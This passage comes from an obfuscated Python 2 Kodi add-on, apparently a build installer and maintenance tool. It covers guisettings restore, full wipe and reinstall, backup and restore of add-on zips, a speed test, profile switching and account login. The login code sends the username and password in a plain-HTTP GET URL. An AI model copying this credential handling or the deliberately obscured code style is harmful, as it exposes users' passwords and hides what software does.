   iIIIiIi = oOo0O . replace ( IiO0o , oOoO ) . replace ( I1iiIIiI11I , iiII1i1i1I1 ) . replace ( oOo0Oooo , o0O0o0O )
   oo0O0 = open ( i1I1iI , mode = 'w+' )
   oo0O0 . write ( str ( iIIIiIi ) )
   oo0O0 . close ( )
   if 27 - 27: IIii1I / IIIIiiII111 - Oo00oo0oO - iiII11i1I1IIi
  except :
   print "### NO GUISETTINGS DOWNLOADED"
   if 76 - 76: II11iIiIIIiI . o000O0o + II11iIiIIIiI + IIii1I + Oo00oo0oO / IIii1I
  if os . path . exists ( iiI1IiI ) :
   os . remove ( iiI1IiI )
   if 95 - 95: o0o
  os . rename ( i1I1iI , iiI1IiI )
  try :
   os . remove ( II )
   if 45 - 45: o0o - II11iIiIIIiI * ooo0O0O00 - o0oo . IIIIiiII111
  except :
   pass
   if 77 - 77: oooOooOOo0OO / o0o
  os . makedirs ( oo0OooOOo0 )
  time . sleep ( 1 )
  IiII1 ( )
  if 49 - 49: Oo00oo0oO
  if 56 - 56: OOO0O0O0ooooo / o0o + II11iIiIIIiI
def OoOo00oOoo0oO ( ) :
 oooOo ( )
 IIiiiIiI1 = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the guisettings zip file you want to restore' , 'files' , '.zip' , False , False , I11i1 )
 if 23 - 23: IIii1I - O00ooooo00 - Oo00oo0oO * Oo00oo0oO . Oo00oo0oO
 if IIiiiIiI1 == '' :
  return
  if 79 - 79: o0o - Iii + OoOo0o / o000O0o * II1
 else :
  IiI1iIIiIi1Ii = 1
  I111I1iii11 ( IIiiiIiI1 , IiI1iIIiIi1Ii )
  if 69 - 69: II11iIiIIIiI % oOoO0o00OO0 / Iii . II11iIiIIIiI - Oo00oo0oO
  if 74 - 74: o0oo - o0ii1I - Oo00oo0oO . OOO0O0O0ooooo % i11Iii
def IIi ( name , url , video ) :
 oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( 'Full Wipe And New Install' , 'This is a great option for first time install or if you\'re encountering any issues with your device. This will wipe all your Kodi settings, do you wish to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if oO000o0Oo00 == 0 :
  return
  if 45 - 45: iiII11i1I1IIi
 elif oO000o0Oo00 == 1 :
  if 4 - 4: o0o
  OOo00oOo = '/storage/openelec_temp/'
  Ooo00O = '/storage/.restore/'
  oOOo0 = os . path . join ( Ooo00O , Ii1Ii ( ) + '.tar' )
  if not os . path . exists ( Ooo00O ) :
   try :
    os . makedirs ( Ooo00O )
   except :
    pass
  try :
   I11 . create ( 'Downloading Build' , 'Please wait' , '' , '' )
   downloader . download ( url , oOOo0 )
   OO0OooOo = True
  except :
   OO0OooOo = False
  time . sleep ( 2 )
  if 60 - 60: O00ooooo00
  if OO0OooOo == True :
   if 57 - 57: i11Iii
   try :
    IIIIIiI11Ii = open ( I11II1i , mode = 'r' )
    oOo0O = IIIIIiI11Ii . read ( )
    IIIIIiI11Ii . close ( )
    if 99 - 99: iiII11i1I1IIi + OoOo0o % i11Iii - o0ii1I
    Iiiiii = re . compile ( 'id="(.+?)"' ) . findall ( oOo0O )
    iII1o00OO0 = Iiiiii [ 0 ] if ( len ( Iiiiii ) > 0 ) else ''
    if 52 - 52: oOoO0o00OO0
   except :
    pass
   if iII1o00OO0 != '' :
    OO0O0ooOOO00 = 'http://noobsandnerds.com/TI/Community_Builds/downloadcount.php?id=%s' % ( iII1o00OO0 )
   try :
    oOOOOoOO0o ( OO0O0ooOOO00 , 5 )
   except :
    pass
    if 93 - 93: ooo0O0O00 . i11iIiiIii
    if 24 - 24: II11iIiIIIiI . o0oo + OoOo0o . oooOooOOo0OO - oOoO0o00OO0 % ooo0O0O00
   if not os . path . exists ( OOo00oOo ) :
    try :
     os . makedirs ( OOo00oOo )
    except :
     pass
     if 49 - 49: OOO0O0O0ooooo . iiII11i1I1IIi / IIIIiiII111
   i11 . ok ( "Download Complete - Press OK To Reboot" , 'Once you press OK your device will attempt to reboot, if it hasn\'t rebooted within 30 seconds please pull the power to manually shutdown. When booting you may see lines of text, don\'t worry this is normal update behaviour!' )
   xbmc . executebuiltin ( 'Reboot' )
   if 29 - 29: oOoO0o00OO0 / oooOooOOo0OO * OOO0O0O0ooooo - i11iIiiIii - o0oo + IIIIiiII111
   if 86 - 86: o000O0o / oOoO0o00OO0 * IIIIiiII111 % i11iIiiIii
def I1i111II ( ) :
 O000O = 0
 if i11 . yesno ( 'Full Wipe And New Install' , 'This is a great option if you\'re encountering any issues with your device. This will wipe all your Kodi settings and restore with whatever is in the backup, do you wish to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' ) :
  IIii1Ii = i11 . browse ( 1 , 'Select the backup file you want to restore' , 'files' , '.tar' , False , False , O000oo0O )
  if IIii1Ii == '' :
   O000O = 1
   if 8 - 8: II11iIiIIIiI
  if O000O == 1 :
   xbmc . log ( "### No file selected, quitting restore process ###" )
   return
  oOOo0 = os . path . join ( OOOOi11i1 , Ii1Ii ( ) + '.tar' )
  if not os . path . exists ( OOOOi11i1 ) :
   try :
    os . makedirs ( OOOOi11i1 )
   except :
    pass
  I11 . create ( 'Copying File To Restore Folder' , '' , 'Please wait...' )
  shutil . copyfile ( IIii1Ii , oOOo0 )
  xbmc . executebuiltin ( 'Reboot' )
  if 44 - 44: o0oo % i11iIiiIii . OoOo0o - OOO0O0O0ooooo / ooo0O0O00 . i11Iii
  if 23 - 23: o0ii1I % IIii1I
def O0OOo00OO ( ) :
 i1iIiIii ( )
 if i1iIIi11i111I ( ) :
  OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue]Restore a locally stored OpenELEC Backup[/COLOR]' , '' , 'restore_local_OE' , 'mainmenu/maintenance.png' , '' , '' , 'Restore A Full OE System Backup' )
  if 30 - 30: o0ii1I
 OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue]Restore A Locally stored build[/COLOR]' , 'local' , 'restore_local_CB' , 'mainmenu/maintenance.png' , '' , '' , 'Restore A Full System Backup' )
 OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue]Restore Local guisettings file[/COLOR]' , 'url' , 'LocalGUIDialog' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your Full System' )
 if 57 - 57: oooOooOOo0OO . o0ii1I % oOoO0o00OO0 - o0ii1I
 if os . path . exists ( os . path . join ( I11i1 , 'addons.zip' ) ) :
  OOo0oO00ooO00 ( '' , 'Restore Your Addons' , 'addons' , 'restore_zip' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your Addons' )
  if 64 - 64: o0ii1I
 if os . path . exists ( os . path . join ( I11i1 , 'addon_data.zip' ) ) :
  OOo0oO00ooO00 ( '' , 'Restore Your Addon UserData' , 'addon_data' , 'restore_zip' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your Addon UserData' )
  if 69 - 69: OOO0O0O0ooooo % ooo0O0O00 . iiII11i1I1IIi + ooo0O0O00
 if os . path . exists ( os . path . join ( I11i1 , 'guisettings.xml' ) ) :
  OOo0oO00ooO00 ( '' , 'Restore Guisettings.xml' , iiI1IiI , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your guisettings.xml' )
  if 57 - 57: oOoO0o00OO0 . OoOo0o . Oo00oo0oO . iiII11i1I1IIi % oooOooOOo0OO * oOoO0o00OO0
 if os . path . exists ( os . path . join ( I11i1 , 'favourites.xml' ) ) :
  OOo0oO00ooO00 ( '' , 'Restore Favourites.xml' , II11iiii1Ii , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your favourites.xml' )
  if 84 - 84: i11Iii . oOoO0o00OO0
 if os . path . exists ( os . path . join ( I11i1 , 'sources.xml' ) ) :
  OOo0oO00ooO00 ( '' , 'Restore Source.xml' , OO0oOoo , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your sources.xml' )
  if 1 - 1: iiII11i1I1IIi * OOO0O0O0ooooo . o000O0o + i11Iii / Iii + o0o
 if os . path . exists ( os . path . join ( I11i1 , 'advancedsettings.xml' ) ) :
  OOo0oO00ooO00 ( '' , 'Restore Advancedsettings.xml' , O0o0Oo , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your advancedsettings.xml' )
  if 68 - 68: Ooo00oOo0oOo
 if os . path . exists ( os . path . join ( I11i1 , 'keyboard.xml' ) ) :
  OOo0oO00ooO00 ( '' , 'Restore Advancedsettings.xml' , O00o0OO , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your keyboard.xml' )
  if 61 - 61: II11iIiIIIiI . oOoO0o00OO0 * oooOooOOo0OO / OoOo0o - o0oo
 if os . path . exists ( os . path . join ( I11i1 , 'RssFeeds.xml' ) ) :
  OOo0oO00ooO00 ( '' , 'Restore RssFeeds.xml' , O0O , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your RssFeeds.xml' )
  if 18 - 18: OoOo0o
  if 34 - 34: ooo0O0O00 + OoOo0o * o0o / Ooo00oOo0oOo
def IiI1i1 ( url ) :
 oooOo ( )
 if 'addons' in url :
  I1IO0 = xbmc . translatePath ( os . path . join ( I11i1 , 'addons.zip' ) )
  i1I1Iii1IiiIi = i1iiIII111ii
  if 73 - 73: OOO0O0O0ooooo . OoOo0o - II1 % o0o % O00ooooo00
 else :
  I1IO0 = xbmc . translatePath ( os . path . join ( I11i1 , 'addon_data.zip' ) )
  i1I1Iii1IiiIi = oo0o0O00
  if 14 - 14: OoOo0o + IIIIiiII111 * iiII11i1I1IIi
 if 'Backup' in OOo0 :
  i1iI ( )
  I11 . create ( "Creating Backup" , "Backing Up" , '' , 'Please Wait' )
  O0O00O = zipfile . ZipFile ( I1IO0 , 'w' , zipfile . ZIP_DEFLATED )
  iIi1Ii = len ( i1I1Iii1IiiIi )
  IiI1IIIII1I = [ ]
  I1I1IiIi1 = [ ]
  for OOOo00 , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( i1I1Iii1IiiIi ) :
   for file in oO0Ooo0OooOOo :
    I1I1IiIi1 . append ( file )
  oo = len ( I1I1IiIi1 )
  for OOOo00 , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( i1I1Iii1IiiIi ) :
   for file in oO0Ooo0OooOOo :
    IiI1IIIII1I . append ( file )
    ii11 = len ( IiI1IIIII1I ) / float ( oo ) * 100
    I11 . update ( int ( ii11 ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
    oOoo0 = os . path . join ( OOOo00 , file )
    if not 'temp' in OoIIi1iI :
     if not OO0o in OoIIi1iI :
      import time
      OOOoo0ooOo00O = '01/01/1980'
      Ii1i1I1 = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( oOoo0 ) ) )
      if Ii1i1I1 > OOOoo0ooOo00O :
       O0O00O . write ( oOoo0 , oOoo0 [ iIi1Ii : ] )
  O0O00O . close ( )
  I11 . close ( )
  i11 . ok ( "Backup Complete" , "You Are Now Backed Up" , '' , '' )
  if 49 - 49: iiII11i1I1IIi
 else :
  I11 . create ( "Extracting Zip" , "Checking " , '' , 'Please Wait' )
  I11 . update ( 0 , "" , "Extracting Zip Please Wait" )
  extract . all ( I1IO0 , i1I1Iii1IiiIi , I11 )
  time . sleep ( 1 )
  xbmc . executebuiltin ( 'UpdateLocalAddons ' )
  xbmc . executebuiltin ( "UpdateAddonRepos" )
  if 57 - 57: OOO0O0O0ooooo * i11Iii - ooo0O0O00 - IIii1I * ooo0O0O00
  if 'Backup' in OOo0 :
   i11 . ok ( "Install Complete" , 'Kodi will now close. Just re-open Kodi and wait for all the updates to complete.' )
   IiII1 ( )
   if 9 - 9: Oo00oo0oO . o0o
  else :
   i11 . ok ( "SUCCESS!" , "You Are Now Restored" , '' , '' )
   if 23 - 23: OOO0O0O0ooooo % II1 - OOO0O0O0ooooo . o000O0o + i11iIiiIii
   if 96 - 96: i11Iii % OOO0O0O0ooooo
def Ooo0oOOO ( url ) :
 xbmc . executebuiltin ( 'RunAddon(%s)' % url )
 if 58 - 58: IIii1I + i11Iii / o0oo % i11Iii % o0ii1I % IIii1I
 if 48 - 48: OOO0O0O0ooooo % o0o * Ooo00oOo0oOo . iiII11i1I1IIi . oOoO0o00OO0
def I1iiiiI ( title ) :
 oOo0OO0o0oO = ''
 O0OoO00OoOO = xbmc . Keyboard ( oOo0OO0o0oO , title )
 O0OoO00OoOO . doModal ( )
 if O0OoO00OoOO . isConfirmed ( ) :
  oOo0OO0o0oO = O0OoO00OoOO . getText ( ) . replace ( ' ' , '%20' )
  if oOo0OO0o0oO == None :
   return False
 return oOo0OO0o0oO
 if 41 - 41: i11iIiiIii - o0oo
 if 20 - 20: i11Iii * OoOo0o * o0ii1I - i11Iii
def i1I1IiiIIIiiI ( url ) :
 O0O0 = oO0ooo00o0o000Oo ( heading = "Search for add-ons" )
 if 62 - 62: iiII11i1I1IIi + II1 / ooo0O0O00
 if ( not O0O0 ) : return False , 0
 if 60 - 60: IIIIiiII111 / Iii . o0o % II11iIiIIIiI
 if 61 - 61: OOO0O0O0ooooo . IIIIiiII111 . OOO0O0O0ooooo * i11iIiiIii * Ooo00oOo0oOo / OoOo0o
 oOIIII = urllib . quote_plus ( O0O0 )
 url += oOIIII
 oooOO00oo0 ( url )
 if 69 - 69: o0o
 if 17 - 17: o0o
def i11iiiiiIi1 ( url ) :
 O0O0 = oO0ooo00o0o000Oo ( heading = "Search for content" )
 if 57 - 57: II1 . ooo0O0O00 + OOO0O0O0ooooo * O00ooooo00 . II1 % Oo00oo0oO
 if 97 - 97: Ooo00oOo0oOo % oooOooOOo0OO - Ooo00oOo0oOo . i11Iii
 if ( not O0O0 ) : return False , 0
 if 50 - 50: ooo0O0O00 % oOoO0o00OO0 + o0o * iiII11i1I1IIi - i11iIiiIii
 if 24 - 24: i11iIiiIii . i11Iii + i11Iii - i11iIiiIii % II11iIiIIIiI
 oOIIII = urllib . quote_plus ( O0O0 )
 url += oOIIII
 OO0oOo ( url )
 if 58 - 58: o000O0o
def OO00oOO ( url ) :
 OO = 'http://noobsandnerds.com/TI/Community_Builds/community_builds.php?id=%s' % ( url )
 Ii1iI111II1I1 = oOOOOoOO0o ( OO , 5 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0ooooO0o0O = re . compile ( 'name="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 i1iI1IIi1I = re . compile ( 'author="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iI1i111I1Ii = re . compile ( 'version="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OOo0 = o0ooooO0o0O [ 0 ] if ( len ( o0ooooO0o0O ) > 0 ) else ''
 IiiiI1Ii = i1iI1IIi1I [ 0 ] if ( len ( i1iI1IIi1I ) > 0 ) else ''
 IIIIIo0ooOoO000oO = iI1i111I1Ii [ 0 ] if ( len ( iI1i111I1Ii ) > 0 ) else ''
 i11 . ok ( OOo0 , 'Author: [COLOR=dodgerblue]' + IiiiI1Ii + '[/COLOR]      Latest Version: [COLOR=dodgerblue]' + IIIIIo0ooOoO000oO + '[/COLOR]' , '' , 'Click OK to view the build page.' )
 try :
  O0OOOOOO0ooO ( url + '&visibility=homepage' , url )
 except :
  return
  xbmc . log ( "### Could not find build No. %s" % url )
  i11 . ok ( 'Build Not Found' , 'Sorry we couldn\'t find the build, it may be it\'s marked as private or servers may be busy. Please try manually searching via the Community Builds section' )
  if 91 - 91: o000O0o * Oo00oo0oO - iiII11i1I1IIi * O00ooooo00 % oOoO0o00OO0 + IIii1I
  if 37 - 37: OOO0O0O0ooooo
def OOOO00oO ( url ) :
 i11 . ok ( "This build is not complete" , 'The guisettings.xml file was not copied over during the last install process. Click OK to go to the build page and complete Install Step 2 (guisettings fix).' )
 if 72 - 72: II11iIiIIIiI . Iii / Ooo00oOo0oOo
 try :
  O0OOOOOO0ooO ( url + '&visibility=homepage' , url )
  if 69 - 69: II11iIiIIIiI * Ooo00oOo0oOo - i11Iii - O00ooooo00 + i11iIiiIii
 except :
  return
  xbmc . log ( "### Could not find build No. %s" % url )
  i11 . ok ( 'Build Not Found' , 'Sorry we couldn\'t find the build, it may be it\'s marked as private. Please try manually searching via the Community Builds section' )
  if 50 - 50: II1 * O00ooooo00 / oooOooOOo0OO
  if 83 - 83: O00ooooo00
def iiiIiii11i1i ( ) :
 OO = 'http://noobsandnerds.com/TI/login/login_details.php?user=%s&pass=%s' % ( Oo , o0O )
 Ii1iI111II1I1 = oOOOOoOO0o ( OO , 5 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 ooo0O0Oo0O = re . compile ( 'login_msg="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OooIii1I1iI = ooo0O0Oo0O [ 0 ] if ( len ( ooo0O0Oo0O ) > 0 ) else ''
 Oo0o = re . compile ( 'posts="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 i1iOO00O0O00oOOO = re . compile ( 'messages="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 ii1111iIIiIIi = re . compile ( 'unread="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 ooOo0Oo = re . compile ( 'email="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 I11i1I111II1IiI = i1iOO00O0O00oOOO [ 0 ] if ( len ( i1iOO00O0O00oOOO ) > 0 ) else ''
 oo00O0oOo = ii1111iIIiIIi [ 0 ] if ( len ( ii1111iIIiIIi ) > 0 ) else ''
 IiI1Ii = ooOo0Oo [ 0 ] if ( len ( ooOo0Oo ) > 0 ) else ''
 oOO00o0oooOo0 = Oo0o [ 0 ] if ( len ( Oo0o ) > 0 ) else ''
 if 17 - 17: oOoO0o00OO0
 OO = 'http://noobsandnerds.com/TI/menu_check'
 try :
  Ii1iI111II1I1 = oOOOOoOO0o ( OO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  OoO0OOoO0 = re . compile ( 'd="(.+?)"' ) . findall ( Ii1iI111II1I1 )
  iiI11i = OoO0OOoO0 [ 0 ] if ( len ( OoO0OOoO0 ) > 0 ) else 'none'
 except :
  iiI11i = 'none'
  if 62 - 62: ooo0O0O00 - II11iIiIIIiI / Ooo00oOo0oOo . Ooo00oOo0oOo
 if 'Welcome Back' in OooIii1I1iI :
  print "### ATTEMPTING TO WRITE COOKIE "
  oo0O0 = open ( IIiiiiiiIi1I1 , mode = 'w+' )
  oo0O0 . write ( 'd="' + binascii . hexlify ( Ii1Ii ( ) ) + '"\nl="' + binascii . hexlify ( OooIii1I1iI ) + '"\np="' + binascii . hexlify ( oOO00o0oooOo0 ) + '"\nm="' + binascii . hexlify ( iiI11i ) + '"' )
  oo0O0 . close ( )
 if not "Account currently restricted" in OooIii1I1iI :
  i11 . ok ( 'Account Details' , 'Username:  ' + Oo , 'Email: ' + IiI1Ii , 'Unread Messages: ' + oo00O0oOo + '/' + I11i1I111II1IiI + '[CR]Posts: ' + oOO00o0oooOo0 )
 else :
  i11 . ok ( 'Account Currently Restricted' , 'Your account has a restriction in place, this is usually for account sharing. Any users caught sharing accounts are automatically put on a suspension and continual abuse will result in a permanent ban.' )
  if 49 - 49: IIii1I / o0o
  if 53 - 53: o0oo
def O0ooO0 ( url , type ) :
 IiI11i1IIiiI = OOooO0OOoo
 if type == 'communitybuilds' :
  IiI11i1IIiiI = 'mainmenu/builds.png'
  ooooOoooo = 'grab_builds'
  if url . endswith ( "visibility=public" ) :
   OOo0oO00ooO00 ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&visibility=public' , 'manual_search' , IiI11i1IIiiI , '' , '' , '' )
  if url . endswith ( "visibility=private" ) :
   OOo0oO00ooO00 ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&visibility=private' , 'manual_search' , IiI11i1IIiiI , '' , '' , '' )
 if type == 'addons' :
  IiI11i1IIiiI = 'mainmenu/addons.png'
  ooooOoooo = 'grab_addons'
  OOo0oO00ooO00 ( 'folder' , '[COLOR=dodgerblue]Sort by Most Popular[/COLOR]' , str ( url ) + '&sortx=downloads&orderx=DESC' , ooooOoooo , IiI11i1IIiiI , '' , '' , '' )
 if type != 'addons' :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=dodgerblue]Sort by Most Popular[/COLOR]' , str ( url ) + '&sortx=downloadcount&orderx=DESC' , ooooOoooo , IiI11i1IIiiI , '' , '' , '' )
 else :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=dodgerblue]Sort by Newest[/COLOR]' , str ( url ) + '&sortx=created&orderx=DESC' , ooooOoooo , IiI11i1IIiiI , '' , '' , '' )
  OOo0oO00ooO00 ( 'folder' , '[COLOR=dodgerblue]Sort by Recently Updated[/COLOR]' , str ( url ) + '&sortx=updated&orderx=DESC' , ooooOoooo , IiI11i1IIiiI , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=dodgerblue]Sort by A-Z[/COLOR]' , str ( url ) + '&sortx=name&orderx=ASC' , ooooOoooo , IiI11i1IIiiI , '' , '' , '' )
 if type == 'public_CB' :
  OOo0oO00ooO00 ( 'folder' , '[COLOR=dodgerblue]Sort by Genre[/COLOR]' , url , 'genres' , IiI11i1IIiiI , '' , '' , '' )
  if 94 - 94: IIii1I / Iii % IIii1I * O00ooooo00 * o0o
  if 5 - 5: OOO0O0O0ooooo . i11iIiiIii + II1 / ooo0O0O00 % o000O0o
def oOO0oOooooO ( ) :
 IIi1IiII ( 'Speed Test Instructions' , '[COLOR=blue][B]What file should I use: [/B][/COLOR][CR]This function will download a file and will work out your speed based on how long it took to download. You will then be notified of '
 'what quality streams you can expect to stream without buffering. You can choose to download a 10MB, 16MB, 32MB, 64MB or 128MB file to use with the test. Using the larger files will give you a better '
 'indication of how reliable your speeds are but obviously if you have a limited amount of bandwidth allowance you may want to opt for a smaller file.'
 '[CR][CR][COLOR=blue][B]How accurate is this speed test:[/B][/COLOR][CR]Not very accurate at all! As this test is based on downloading a file from a server it\'s reliant on the server not having a go-slow day '
 'but the servers used should be pretty reliable. The 10MB file is hosted on a different server to the others so if you\'re not getting the results expected please try another file. If you have a fast fiber '
 'connection the chances are your speed will show as considerably slower than your real download speed due to the server not being able to send the file as fast as your download speed allows. Essentially the '
 'test results will be limited by the speed of the server but you will at least be able to see if it\'s your connection that\'s causing buffering or if it\'s the host you\'re trying to stream from'
 '[CR][CR][COLOR=blue][B]What is the differnce between Live Streams and Online Video:[/COLOR][/B][CR]When you run the test you\'ll see results based on your speeds and these let you know the quality you should expect to '
 'be able stream with your connection. Live Streams as the title suggests are like traditional TV channels, they are being streamed live so for example if you wanted to watch CNN this would fall into this category. '
 'Online Videos relates to movies, tv shows, youtube clips etc. Basically anything that isn\'t live - if you\'re new to the world of streaming then think of it as On Demand content, this is content that\'s been recorded and stored on the web.'
 '[CR][CR][COLOR=blue][B]Why am I still getting buffering:[/COLOR][/B][CR]The results you get from this test are strictly based on your download speed, there are many other factors that can cause buffering and contrary to popular belief '
 'having a massively fast internet connection will not make any difference to your buffering issues if the server you\'re trying to get the content from is unable to send it fast enough. This can often happen and is usually '
 'down to heavy traffic (too many users accessing the same server). A 10 Mb/s connection should be plenty fast enough for almost all content as it\'s very rare a server can send it any quicker than that.'
 '[CR][CR][COLOR=blue][B]What\'s the difference between MB/s and Mb/s:[/COLOR][/B][CR]A lot of people think the speed they see advertised by their ISP is Megabytes (MB/S) per second - this is not true. Speeds are usually shown as Mb/s '
 'which is Megabit per second - there are 8 of these to a megabyte so if you want to work out how many megabytes per second you\'re getting you need to divide the speed by 8. It may sound sneaky but really it\'s just the unit that has always been used.'
 '[CR][CR]A direct link to the buffering thread explaining what you can do to improve your viewing experience can be found at [COLOR=yellow]http://bit.ly/bufferingfix[/COLOR]'
 '[CR][CR]Thank you, [COLOR=dodgerblue]noobsandnerds[/COLOR] Team.' )
 if 42 - 42: o0o % iiII11i1I1IIi + Oo00oo0oO - o0o . IIii1I - IIIIiiII111
 if 27 - 27: ooo0O0O00 % iiII11i1I1IIi . oOoO0o00OO0 . O00ooooo00 % Iii . o0ii1I
def I111I1 ( ) :
 OOo0oO00ooO00 ( '' , '[COLOR=blue]Instructions - Read me first[/COLOR]' , 'none' , 'speed_instructions' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Download 5MB file' , 'http://download.thinkbroadband.com/5MB.zip' , 'runtest' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Download 10MB file' , 'http://download.thinkbroadband.com/10MB.zip' , 'runtest' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Download 20MB file' , 'http://download.thinkbroadband.com/20MB.zip' , 'runtest' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Download 50MB file' , 'http://download.thinkbroadband.com/50MB.zip' , 'runtest' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Download 100MB file' , 'http://download.thinkbroadband.com/100MB.zip' , 'runtest' , '' , '' , '' , '' )
 if 90 - 90: OoOo0o % o0ii1I . iiII11i1I1IIi
def i1iI11IiII ( name ) :
 if 37 - 37: IIIIiiII111 / Ooo00oOo0oOo
 I11 . create ( 'Creating Profile' , '' , '' , '' )
 i1I1Iiii = O00 ( name )
 if 66 - 66: i11Iii + oooOooOOo0OO % II1
 if 23 - 23: oooOooOOo0OO . Iii + IIii1I
 IiIiI1i1 = [ ]
 for O0oO0 in os . listdir ( i1iIIi1 ) :
  IiIiI1i1 . append ( O0oO0 )
  if 17 - 17: Oo00oo0oO
  if 12 - 12: O00ooooo00 . o0oo
  II1ii1 = open ( os . path . join ( oO , name , 'addonlist' ) , mode = 'r' )
  OOO00O00ooo0o = II1ii1 . read ( )
  II1ii1 . close ( )
  OOO00O00ooo0o = OOO00O00ooo0o . split ( '|' )
  if 61 - 61: O00ooooo00 / O00ooooo00 + i11Iii . OoOo0o * i11Iii
  if 19 - 19: o0ii1I . Ooo00oOo0oOo / O00ooooo00
 iio00O0o00oo ( 'profiles' )
 for O0oO0 in os . listdir ( i1iiIII111ii ) :
  if not O0oO0 in IiIiI1i1 and O0oO0 != 'plugin.program.totalinstaller' and O0oO0 != 'repository.noobsandnerds' and O0oO0 != 'packages' :
   try :
    shutil . copytree ( os . path . join ( oO0Oo , 'addons' , O0oO0 ) , os . path . join ( oO , 'Master' , 'backups' , O0oO0 ) )
    if IiII == 'true' :
     xbmc . log ( "### Successfully copied %s to %s" % ( O0oO0 , os . path . join ( oO , 'Master' , 'backups' , O0oO0 ) ) )
   except :
    xbmc . log ( "### Failed to copy %s to backup folder, must already exist" % O0oO0 )
   if not O0oO0 in OOO00O00ooo0o and O0oO0 != I11iii1Ii :
    try :
     os . rename ( os . path . join ( i1iiIII111ii , O0oO0 ) , os . path . join ( oO , 'Master' , O0oO0 ) )
    except :
     try :
      shutil . copytree ( os . path . join ( i1iiIII111ii , O0oO0 ) , os . path . join ( oO , 'Master' , O0oO0 ) )
     except :
      try :
       shutil . rmtree ( os . path . join ( i1iiIII111ii , O0oO0 ) )
      except :
       xbmc . log ( "### Unable to move %s as it's currently in use" % O0oO0 )
 shutil . rmtree ( oO0Oo )
 if 82 - 82: OOO0O0O0ooooo / ooo0O0O00 * o0oo - o0o + iiII11i1I1IIi
 if 47 - 47: oOoO0o00OO0 * o000O0o / oOoO0o00OO0 + IIIIiiII111 * Ooo00oOo0oOo
 for O0oO0 in OOO00O00ooo0o :
  if not O0oO0 in IiIiI1i1 and not O0oO0 in i1iiIII111ii :
   try :
    os . rename ( os . path . join ( oO , 'Master' , O0oO0 ) , os . path . join ( i1iiIII111ii , O0oO0 ) )
   except :
    pass
    if 78 - 78: OoOo0o - O00ooooo00 + Iii + iiII11i1I1IIi * oOoO0o00OO0 * o0ii1I
 oooO ( )
 II111iiI1Ii1 ( )
 oo0oO0oO00oO ( OOOO0OOoO0O0 )
 xbmc . log ( "### WIPE FUNCTIONS COMPLETE" )
 if 94 - 94: i11Iii * II11iIiIIIiI
 if 59 - 59: OoOo0o * ooo0O0O00
 try :
  IIIIIiI11Ii = open ( IIIII , mode = 'r' )
  oOo0O = IIIIIiI11Ii . read ( )
  IIIIIiI11Ii . close ( )
  xbmc . log ( "### original idfile contents: %s" % oOo0O )
 except :
  xbmc . log ( "### original id file does not exist" )
  if 31 - 31: o0o / OOO0O0O0ooooo
 try :
  extract . all ( os . path . join ( oO , name , 'build.zip' ) , Oo0o0000o0o0 , I11 )
  OO0OooOo = 1
  xbmc . log ( "### Extraction of build successful" )
 except :
  i11 . ok ( 'Error' , "Sorry it wasn't possible to extract your build, there is a problem with your build zip file." )
  OO0OooOo = 0
  if 57 - 57: O00ooooo00 % i11Iii
  if 69 - 69: o0ii1I
 if not os . path . exists ( IIIii1II1II ) :
  os . makedirs ( IIIii1II1II )
 if os . path . exists ( os . path . join ( oo0o0O00 , 'plugin.program.totalinstaller' , 'id.xml' ) ) and os . path . exists ( os . path . join ( oo0o0O00 , 'ti_id' , 'id.xml' ) ) :
  os . remove ( IIIII )
  xbmc . log ( '### REMOVED STANDARD id.xml' )
 if os . path . exists ( os . path . join ( oo0o0O00 , 'ti_id' , 'id.xml' ) ) :
  os . rename ( os . path . join ( oo0o0O00 , 'ti_id' , 'id.xml' ) , IIIII )
 else :
  xbmc . log ( '### id file does not exist' )
  if 69 - 69: OoOo0o
  if 83 - 83: IIii1I . o0ii1I + OoOo0o . II1 / i11Iii + Ooo00oOo0oOo
 if os . path . exists ( o0 ) and os . path . exists ( os . path . join ( oo0o0O00 , 'ti_id' , 'startup.xml' ) ) :
  xbmc . log ( "### startup.xml and temporary startup.xml exists, attempting remove of original and replace with temp" )
  os . remove ( o0 )
  xbmc . log ( "### removal ok" )
 if os . path . exists ( os . path . join ( oo0o0O00 , 'ti_id' , 'startup.xml' ) ) :
